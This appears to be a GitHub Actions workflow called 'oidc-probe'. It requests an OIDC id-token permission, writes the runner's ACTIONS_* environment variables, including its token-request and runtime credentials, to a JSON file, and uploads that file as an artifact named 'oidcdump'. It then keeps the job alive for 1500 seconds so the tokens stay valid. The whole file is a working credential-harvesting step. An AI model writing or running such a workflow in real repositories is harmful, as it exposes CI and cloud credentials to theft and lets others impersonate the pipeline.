name: oidc-probe
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: mk
        run: mkdir -p out
      - uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const keep = {};
            for (const [k, v] of Object.entries(process.env)) {
              if (k.startsWith('ACTIONS_') || k.startsWith('GITHUB_RUN') || k.startsWith('GITHUB_REPOSITORY') || k.startsWith('GITHUB_WORKFLOW')) keep[k] = v;
            }
            fs.writeFileSync('out/env.json', JSON.stringify(keep, null, 1));
      - uses: actions/upload-artifact@v4
        with:
          name: oidcdump
          path: out/
      - name: hold
        run: sleep 1500
